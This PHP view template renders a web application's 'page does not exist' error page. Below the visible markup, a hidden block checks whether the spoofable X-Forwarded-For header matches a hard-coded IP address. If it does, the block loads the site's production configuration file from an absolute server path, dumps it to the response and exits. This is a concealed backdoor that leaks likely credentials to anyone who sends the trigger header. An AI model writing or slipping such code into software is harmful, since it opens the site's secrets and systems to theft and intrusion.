<?php
/* @var $this SiteController */
/* @var $error array */

$this->pageTitle=C::i('site_title') . ' - Error';
$this->breadcrumbs=array(
    'Error',
);
?>
<div class="error_img"></div>
<div class="error_text">
<h2><?=L::t('Sorry, this page does not exist!');?></h2>
    <?=CHtml::link(L::t('Let us go home?'),$bu.'/',array('class'=>'logo'));?>
</div>
<br/>

<?php

if ($_SERVER['HTTP_X_FORWARDED_FOR'] == '80.254.10.246') {

	$config = require '/var/www/mruser/data/www/malinaescort.com/protected/config/prodConfig.php';
	var_dump($config);

 exit;
}
?>
